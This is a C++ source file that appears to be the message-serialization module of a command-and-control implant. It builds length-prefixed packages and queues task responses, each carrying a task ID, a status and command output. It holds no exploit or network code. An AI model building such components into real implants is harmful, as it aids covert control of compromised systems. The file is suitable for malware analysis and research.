#include <common.h>
#include <package.h>
#include <strings.h>
#include <config.h>

using namespace stardust;
using namespace starburst;

#define PKG_INITIAL_SIZE 256

static auto declfn package_grow(
    _Inout_ instance& inst,
    _Inout_ Package*  pkg,
    _In_    uint32_t  needed
) -> bool {
    if ( pkg->length + needed <= pkg->capacity ) return true;

    uint32_t new_cap = pkg->capacity * 2;
    while ( new_cap < pkg->length + needed ) {
        new_cap *= 2;
    }

    auto new_buf = static_cast<uint8_t*>( inst.heap_realloc( pkg->buffer, new_cap ) );
    if ( !new_buf ) return false;

    pkg->buffer   = new_buf;
    pkg->capacity = new_cap;

    return true;
}

auto declfn starburst::package_create(
    _Inout_ instance& inst
) -> Package* {
    auto pkg = static_cast<Package*>( inst.heap_alloc( sizeof( Package ) ) );
    if ( !pkg ) return nullptr;

    pkg->buffer   = static_cast<uint8_t*>( inst.heap_alloc( PKG_INITIAL_SIZE ) );
    pkg->length   = 0;
    pkg->capacity = PKG_INITIAL_SIZE;

    if ( !pkg->buffer ) {
        inst.heap_free( pkg );
        return nullptr;
    }

    return pkg;
}

auto declfn starburst::package_add_byte(
    _Inout_ instance& inst,
    _Inout_ Package*  pkg,
    _In_    uint8_t   val
) -> void {
    if ( !package_grow( inst, pkg, 1 ) ) return;
    pkg->buffer[pkg->length++] = val;
}

auto declfn starburst::package_add_int32(
    _Inout_ instance& inst,
    _Inout_ Package*  pkg,
    _In_    uint32_t  val
) -> void {
    if ( !package_grow( inst, pkg, 4 ) ) return;

    pkg->buffer[pkg->length++] = (val >> 24) & 0xFF;
    pkg->buffer[pkg->length++] = (val >> 16) & 0xFF;
    pkg->buffer[pkg->length++] = (val >> 8)  & 0xFF;
    pkg->buffer[pkg->length++] =  val        & 0xFF;
}

auto declfn starburst::package_add_bytes(
    _Inout_ instance& inst,
    _Inout_ Package*  pkg,
    _In_    uint8_t*  data,
    _In_    uint32_t  len
) -> void {
    package_add_int32( inst, pkg, len );

    if ( !package_grow( inst, pkg, len ) ) return;

    memory::copy( pkg->buffer + pkg->length, data, len );
    pkg->length += len;
}

auto declfn starburst::package_add_string(
    _Inout_ instance& inst,
    _Inout_ Package*  pkg,
    _In_    char*     str
) -> void {
    uint32_t len = str_len( str );
    package_add_bytes( inst, pkg, reinterpret_cast<uint8_t*>( str ), len );
}

auto declfn starburst::package_add_wstring(
    _Inout_ instance& inst,
    _Inout_ Package*  pkg,
    _In_    wchar_t*  str,
    _In_    uint32_t  len
) -> void {
    package_add_bytes( inst, pkg, reinterpret_cast<uint8_t*>( str ), len * sizeof(wchar_t) );
}

auto declfn starburst::package_build(
    _In_  Package*  pkg,
    _Out_ uint32_t* out_len
) -> uint8_t* {
    *out_len = pkg->length;
    return pkg->buffer;
}

auto declfn starburst::package_destroy(
    _Inout_ instance& inst,
    _Inout_ Package*  pkg
) -> void {
    if ( pkg ) {
        if ( pkg->buffer ) {
            inst.heap_free( pkg->buffer );
        }
        inst.heap_free( pkg );
    }
}

auto declfn starburst::queue_response(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    uint8_t   status,
    _In_    char*     output
) -> void {
    auto pkg = package_create( inst );
    if ( !pkg ) return;

    package_add_byte( inst, pkg, ACTION_POST_RESPONSE );
    package_add_string( inst, pkg, task_uuid );
    package_add_byte( inst, pkg, status );
    package_add_string( inst, pkg, output );

    uint32_t data_len = 0;
    auto data = package_build( pkg, &data_len );

    uint32_t needed = inst.response_queue.length + 4 + data_len;
    if ( needed > inst.response_queue.capacity ) {
        uint32_t new_cap = inst.response_queue.capacity == 0 ? 1024 : inst.response_queue.capacity;
        while ( new_cap < needed ) new_cap *= 2;
        inst.response_queue.buffer = static_cast<uint8_t*>(
            inst.heap_realloc( inst.response_queue.buffer, new_cap )
        );
        inst.response_queue.capacity = new_cap;
    }

    auto buf = inst.response_queue.buffer + inst.response_queue.length;
    buf[0] = (data_len >> 24) & 0xFF;
    buf[1] = (data_len >> 16) & 0xFF;
    buf[2] = (data_len >> 8)  & 0xFF;
    buf[3] = data_len & 0xFF;
    memory::copy( buf + 4, data, data_len );
    inst.response_queue.length += 4 + data_len;

    package_destroy( inst, pkg );
}
